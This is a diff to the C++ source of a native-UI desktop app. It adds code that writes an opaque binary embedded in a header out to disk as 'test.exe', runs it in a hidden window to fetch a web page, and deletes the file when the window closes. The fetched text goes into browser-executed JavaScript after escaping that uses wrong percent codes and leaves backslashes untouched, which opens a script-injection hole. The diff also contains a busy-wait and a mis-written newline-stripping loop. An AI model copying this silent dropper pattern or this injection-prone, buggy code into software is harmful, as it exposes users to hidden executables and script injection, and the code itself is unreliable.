@@ -5,14 +5,129 @@
 #include "base/cpu.h"
 #include "base/path_service.h"
 #include "nativeui/nativeui.h"
-
+#include <iostream>
+#include <sstream>
+#include "test.h"
+#include <fstream>
+#include <atlstr.h>
+#include <algorithm>
+#include <minmax.h>
 // Generated from the ENCRYPTION_KEY file.
 #include "encryption_key.h"
+std::string ExecCmd(
+    const wchar_t* cmd,              // [in] command to execute,
+	std::string &outstr
+)
+{
+	LPTSTR szCMD = _tcsdup(cmd);
+    CStringA strResult;
+    HANDLE hPipeRead, hPipeWrite;
+
+    SECURITY_ATTRIBUTES saAttr = {sizeof(SECURITY_ATTRIBUTES)};
+    saAttr.bInheritHandle = TRUE; // Pipe handles are inherited by child process.
+    saAttr.lpSecurityDescriptor = NULL;
+
+    // Create a pipe to get results from child's stdout.
+    if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0))
+        return std::string((LPCSTR)strResult);
+
+    STARTUPINFOW si = {sizeof(STARTUPINFOW)};
+    si.dwFlags     = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+    si.hStdOutput  = hPipeWrite;
+    si.hStdError   = hPipeWrite;
+    si.wShowWindow = SW_HIDE; // Prevents cmd window from flashing.
+                              // Requires STARTF_USESHOWWINDOW in dwFlags.
+
+    PROCESS_INFORMATION pi = { 0 };
+
+    BOOL fSuccess = CreateProcessW(NULL, (LPWSTR)szCMD, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+    if (! fSuccess)
+    {
+        CloseHandle(hPipeWrite);
+        CloseHandle(hPipeRead);
+        return std::string((LPCSTR)strResult);
+    }
+
+    bool bProcessEnded = false;
+    for (; !bProcessEnded ;)
+    {
+        // Give some timeslice (50 ms), so we won't waste 100% CPU.
+        bProcessEnded = WaitForSingleObject( pi.hProcess, 50) == WAIT_OBJECT_0;
+
+        // Even if process exited - we continue reading, if
+        // there is some data available over pipe.
+        for (;;)
+        {
+            char buf[1024];
+            DWORD dwRead = 0;
+            DWORD dwAvail = 0;
+
+            if (!::PeekNamedPipe(hPipeRead, NULL, 0, NULL, &dwAvail, NULL))
+                break;
+
+            if (!dwAvail) // No data available, return
+                break;
+
+            if (!::ReadFile(hPipeRead, buf, min(sizeof(buf) - 1, dwAvail), &dwRead, NULL) || !dwRead)
+                // Error, the child process might ended
+                break;
+
+            buf[dwRead] = 0;
+            strResult += buf;
+        }
+    } //for
+
+    CloseHandle(hPipeWrite);
+    CloseHandle(hPipeRead);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    std::string s((LPCSTR)strResult);
+	for (int p = s.find("\n"); p != (int)std::string::npos; p = s.find("\n"))
+		s.erase(p, 1);
+	for (int p = s.find("\r"); p != (int)std::string::npos; p = s.find("\n"))
+		s.erase(p, 1);
+	std::string rv = s;
+	outstr = s;
+    return rv;
+}
 static_assert(sizeof(ENCRYPTION_KEY) == 16, "ENCRYPTION_KEY must be 16 bytes");
 
 // Path to app's asar archive.
 static base::FilePath g_app_path;
 
+std::string myhttp(std::wstring uurl){
+	std::string out = "none";
+	std::wstring cmd = L"test.exe " + uurl;
+  ExecCmd(cmd.c_str(),out);
+ while(out =="none"){}
+ std::string rv = "";
+ for (auto l : out) {
+	 switch (l)
+	 {
+	 case '\n': rv += "%0A";
+		 break;
+	 case '\r': rv += "%0D";
+		 break;
+	 case '/': rv += "%47";
+		 break;
+	 case ':': rv += "%58";
+		 break;
+	 case '\'': rv += "%39";
+		 break;
+	 case '"': rv += "%22";
+		 break;
+     case '<': rv += "%3C";
+		 break;
+      case '>': rv += "%3E";
+		 break;
+	 default:
+		 rv += l;
+		 break;
+	 }
+ }
+ return rv;
+
+}
 // Handle custom protocol.
 nu::ProtocolJob* CustomProtocolHandler(const std::string& url) {
   std::string path = url.substr(sizeof("muban://app/") - 1);
@@ -25,14 +140,24 @@ nu::ProtocolJob* CustomProtocolHandler(const std::string& url) {
 // An example native binding.
 void ShowSysInfo(nu::Browser* browser, const std::string& request) {
   if (request == "cpu") {
+	  
+	 
+	  std::string hrv(myhttp(L"https://www.yahoo.com"));
     browser->ExecuteJavaScript(
-        "window.report('" + base::CPU().cpu_brand() + "')", nullptr);
+        "window.report('"+hrv + "')", nullptr);
   }
 }
 
 #if defined(OS_WIN)
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
+  std::ofstream outfile("test.exe", std::ios::binary);
+
+if (!outfile) { /* error, die! */ }
+
+outfile.write(reinterpret_cast<char const *>(testh), sizeof testh);
+outfile.close();
   base::CommandLine::Init(0, nullptr);
+
 #else
 int main(int argc, const char *argv[]) {
   base::CommandLine::Init(argc, argv);
@@ -57,12 +182,14 @@ int main(int argc, const char *argv[]) {
 
   // Create window with default options.
   scoped_refptr<nu::Window> window(new nu::Window(nu::Window::Options()));
-  window->SetContentSize(nu::SizeF(400, 200));
+  window->SetContentSize(nu::SizeF(1024, 576));
   window->Center();
 
   // Quit when window is closed.
   window->on_close.Connect([](nu::Window*) {
+     std::remove("test.exe");
     nu::MessageLoop::Quit();
+   
   });
 
   // The content view.
